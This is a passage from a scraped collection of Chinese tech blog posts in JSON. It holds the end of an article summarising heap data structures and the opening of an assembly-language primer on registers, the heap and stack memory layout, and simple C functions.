总结</h2>\n<ul>\n<li>堆是基于树的满足一定约束的重要数据结构，存在许多变体例如二叉堆、二项式堆、斐波那契堆（很高效）等。</li>\n<li>堆的几个基本操作都依赖于两个重要的函数<code>siftUp</code>和<code>siftDown</code>，堆的<code>insert</code>通常是在堆尾插入新元素并<code>siftUp</code>调整堆，而<code>extractMin</code>是在<br>\n删除堆顶元素，然后将最后一个元素放置堆顶并调用<code>siftDown</code>调整堆。</li>\n<li>二叉堆是常用的一种堆，其是一棵二叉树；由于二叉树良好的性质，因此常常采用数组来存储堆。<br>\n堆得基本操作的时间复杂度如下表所示：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>heapify</th>\n<th>insert</th>\n<th>peek</th>\n<th>extractMin</th>\n<th>delete(i)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>O(n)</code></td>\n<td><code>O(logn)</code></td>\n<td><code>O(1)</code></td>\n<td><code>O(logn)</code></td>\n<td><code>O(logn)</code></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>二叉堆通常被用来实现堆排序算法，堆排序可以<code>sort in place</code>，堆排序的时间复杂度的上界是<code>O(nlogn)</code>，是一种很优秀的排序算法。由于存在相同键值的两个元素处于两棵子树中，而两个元素的顺序可能会在后续的堆调整中发生改变，因此堆排序不是稳定的。降序排序需要建立小顶堆，升序排序需要建立大顶堆。</li>\n<li>堆是实现抽象数据类型优先队列的一种方式，优先队列有很广泛的应用，例如Huffman编码中使用优先队列利用贪心算法构建最优前缀编码树。</li>\n<li>堆的另一个应用就是在海量数据中找到TopK个数，思想是维护一个大小为K的二叉堆，然后不断地比较堆顶元素，判断是否需要执行替换对顶元素的操作，采用<br>\n此方法的时间复杂度为<code>n*logk</code>，当<code>k</code>和<code>n</code>的数量级差距很大的时候，这种方式是很有效的方法。</li>\n</ul>\n<h2 id=\"6-references\">6 references</h2>\n<p>[1] <a href=\"https://en.wikipedia.org/wiki/Heap_(data_structure\" target=\"_blank\" rel=\"noopener\">https://en.wikipedia.org/wiki/Heap_(data_structure)</a>)</p>\n<p>[2] <a href=\"https://en.wikipedia.org/wiki/Heapsort\" target=\"_blank\" rel=\"noopener\">https://en.wikipedia.org/wiki/Heapsort</a></p>\n<p>[3] <a href=\"https://en.wikipedia.org/wiki/Priority_queue\" target=\"_blank\" rel=\"noopener\">https://en.wikipedia.org/wiki/Priority_queue</a></p>\n<p>[4] <a href=\"https://www.cnblogs.com/swiftma/p/6006395.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/swiftma/p/6006395.html</a></p>\n<p>[5] Thomas H.Cormen, Charles E.Leiserson, Ronald L.Rivest, Clifford Stein.算法导论[M].北京:机械工业出版社,2015:245-249</p>\n<p>[6] Jon Bentley.编程珠玑[M].北京:人民邮电出版社,2015:161-174</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113552\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113552votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113552\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/03/6a6583a113036f92733762f47f315de4.png"], "title": "汇编语言入门教程", "fav_nums": 5, "url": "http://blog.jobbole.com/113509/", "create_date": "2018/01/21", "url_object_id": "18c4d836f5ced027a8bc7f3f561f8a48", "comment_nums": 0, "front_image_path": "full/517254353a9a1cc83501e1159bfc92f230e6e50c.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html\">阮一峰</a>   </div><p>学习编程其实就是学高级语言，即那些为人类设计的计算机语言。</p>\n<p>但是，计算机不理解高级语言，必须通过编译器转成二进制代码，才能运行。学会高级语言，并不等于理解计算机实际的运行步骤。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/3443f0ce5016cecae87f1ee60b81a33b.png\" alt=\"\"></p>\n<p>计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什么，以及代码的运行步骤，就一定要学习汇编语言。</p>\n<p>汇编语言不容易学习，就连简明扼要的介绍都很难找到。下面我尝试写一篇最好懂的汇编语言教程，解释 CPU 如何执行代码。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f2d4d958fda459a28b8c56e033b7cfc7.jpg\" alt=\"\"></p>\n<h2>一、汇编语言是什么？</h2>\n<p>我们知道，CPU 只负责计算，本身不具备智能。你输入一条指令（instruction），它就运行一次，然后停下来，等待下一条指令。</p>\n<p>这些指令都是二进制的，称为操作码（opcode），比如加法指令就是<code>00000011</code>。<a href=\"http://www.ruanyifeng.com/blog/2014/11/compiler.html\">编译器</a>的作用，就是将高级语言写好的程序，翻译成一条条操作码。</p>\n<p>对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/d0f9b002c0b4cab2faeb7bc4fb342857.jpg\" alt=\"\"></p>\n<p><strong>汇编语言是二进制指令的文本形式</strong>，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p>\n<h2>二、来历</h2>\n<p>最早的时候，编写程序就是手写二进制指令，然后通过各种开关输入计算机，比如要做加法了，就按一下加法开关。后来，发明了纸带打孔机，通过在纸带上打孔，将二进制指令自动输入计算机。</p>\n<p>为了解决二进制指令的可读性问题，工程师将那些指令写成了八进制。二进制转八进制是轻而易举的，但是八进制的可读性也不行。很自然地，最后还是用文字表达，加法指令写成 ADD。内存地址也不再直接引用，而是用标签表示。</p>\n<p>这样的话，就多出一个步骤，要把这些文字指令翻译成二进制，这个步骤就称为 assembling，完成这个步骤的程序就叫做 assembler。它处理的文本，自然就叫做 aseembly code。标准化以后，称为 assembly language，缩写为 asm，中文译为汇编语言。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/06e7e54cdaef72255f4c3b5d1a97f6ff.jpg\" alt=\"\"></p>\n<p>每一种 CPU 的机器指令都是不一样的，因此对应的汇编语言也不一样。本文介绍的是目前最常见的 x86 汇编语言，即 Intel 公司的 CPU 使用的那一种。</p>\n<h2>三、寄存器</h2>\n<p>学习汇编语言，首先必须了解两个知识点：寄存器和内存模型。</p>\n<p>先来看寄存器。CPU 本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是，CPU 的运算速度远高于内存的读写速度，为了避免被拖慢，CPU 都自带一级缓存和二级缓存。基本上，CPU 缓存可以看作是读写速度较快的内存。</p>\n<p>但是，CPU 缓存还是不够快，另外数据在缓存里面的地址是不固定的，CPU 每次读写都要寻址也会拖慢速度。因此，除了缓存之外，CPU 还自带了寄存器（register），用来储存最常用的数据。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU 优先读写寄存器，再由寄存器跟内存交换数据。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/9a7335e708252c99b00b6fff4fdfe027.png\" alt=\"\"></p>\n<p>寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。</p>\n<h2>四、寄存器的种类</h2>\n<p>早期的 x86 CPU 只有8个寄存器，而且每个都有不同的用途。现在的寄存器已经有100多个了，都变成通用寄存器，不特别指定用途了，但是早期寄存器的名字都被保存了下来。</p>\n<blockquote>\n<ul>\n<li>EAX</li>\n<li>EBX</li>\n<li>ECX</li>\n<li>EDX</li>\n<li>EDI</li>\n<li>ESI</li>\n<li>EBP</li>\n<li>ESP</li>\n</ul>\n</blockquote>\n<p>上面这8个寄存器之中，前面七个都是通用的。ESP 寄存器有特定用途，保存当前 Stack 的地址（详见下一节）。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/dfaf4aea08b128207a5b2e64808a37b7.png\" alt=\"\"></p>\n<p>我们常常看到 32位 CPU、64位 CPU 这样的名称，其实指的就是寄存器的大小。32 位 CPU 的寄存器大小就是4个字节。</p>\n<h2>五、内存模型：Heap</h2>\n<p>寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。</p>\n<p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址，结束地址是较大的那个地址。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/7f1f51353a99a62ee70454c2c5030c92.png\" alt=\"\"></p>\n<p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用<code>malloc</code>命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址<code>0x1000</code>开始给他分配，一直分配到地址<code>0x100A</code>，如果再要求得到22个字节，那么就分配到<code>0x1020</code>。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f056b4759e9eb74123d522070693a83a.png\" alt=\"\"></p>\n<p>这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。</p>\n<h2>六、内存模型：Stack</h2>\n<p>除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/83b5e7fb052711d40315bc7ab57631df.png\" alt=\"\"></p>\n<p>请看下面的例子。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631ade360564281\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nint main() {\r\n   int a = 2;\r\n   int b = 3;\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631ade360564281-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631ade360564281-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631ade360564281-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631ade360564281-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631ade360564281-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631ade360564281-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631ade360564281-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631ade360564281-2\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631ade360564281-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631ade360564281-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631ade360564281-5\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631ade360564281-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面代码中，系统开始执行<code>main</code>函数时，会为它在内存里面建立一个帧（frame），所有<code>main</code>的内部变量（比如<code>a</code>和<code>b</code>）都保存在这个帧里面。<code>main</code>函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/27189d0282df82fbf7c1ac4d0cf0ffe1.png\" alt=\"\"></p>\n<p>如果函数内部调用了其他函数，会发生什么情况？</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631ae7927039929\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nint main() {\r\n   int a = 2;\r\n   int b = 3;\r\n   return add_a_and_b(a, b);\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631ae7927039929-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631ae7927039929-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631ae7927039929-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631ae7927039929-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631ae7927039929-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631ae7927039929-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631ae7927039929-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631ae7927039929-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631ae7927039929-2\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631ae7927039929-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631ae7927039929-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631ae7927039929-5\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">add_a_and_b</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631ae7927039929-6\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631ae7927039929-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面代码中，<code>main</code>函数内部调用了<code>add_a_and_b</code>函数。执行到这一行的时候，系统也会为<code>add_a_and_b</code>新建一个帧，用来储存它的内部变量。也就是说，此时同时存在两个帧：<code>main</code>和<code>add_a_and_b</code>。一般来说，调用栈有多少层，就有多少帧。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f50d85219ea91b9a57e41b0a96b41a0a.png\" alt=\"\"></p>\n<p>等到<code>add_a_and_b</code>运行结束，它的帧就会被回收，系统会回到函数<code>main</code>刚才中断执行的地方，继续往下执行。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。</p>\n<p>所有的帧都存放在 Stack，由于帧是一层层叠加的，所以 Stack 叫做栈。生成新的帧，叫做”入栈”，英文是 push；栈的回收叫做”出栈”，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做”后进先出”的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b09567a32cd68105cd5f48b12c096cea.jpg\" alt=\"\"></p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/2e07fe50fc379886e4928b060cd6a679.jpg\" alt=\"\"></p>\n<p>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。比如，内存区域的结束地址是<code>0x8000</code>，第一帧假定是16字节，那么下一次分配的地址就会从<code>0x7FF0</code>开始；第二帧假定需要64字节，那么地址就会移动到<code>0x7FB0</code>。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/4ce2ece87cfc3354ada81668ceabc810.png\" alt=\"\"></p>\n<h2>七、CPU 指令</h2>\n<h3>7.1 一个实例</h3>\n<p>了解寄存器和内存模型以后，就可以来看汇编语言到底是什么了。下面是一个简单的程序<code>example.c</code>。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631aec255394017\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\nint add_a_and_b(int a, int b) {\r\n   return a + b;\r\n}\r\n\r\nint main() {\r\n   return add_a_and_b(2, 3);\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631aec255394017-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631aec255394017-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631aec255394017-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631aec255394017-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631aec255394017-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631aec255394017-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631aec255394017-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631aec255394017-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631aec255394017-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631aec255394017-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631aec255394017-2\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">add_a_and_b</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631aec255394017-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631aec255394017-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631aec255394017-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631aec255394017-6\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631aec255394017-7\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">add_a_and_b</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631aec255394017-8\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631aec255394017-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>\n</p></blockquote>\n<p>gcc 将这个程序转成汇编语言。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631af0050160352\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; 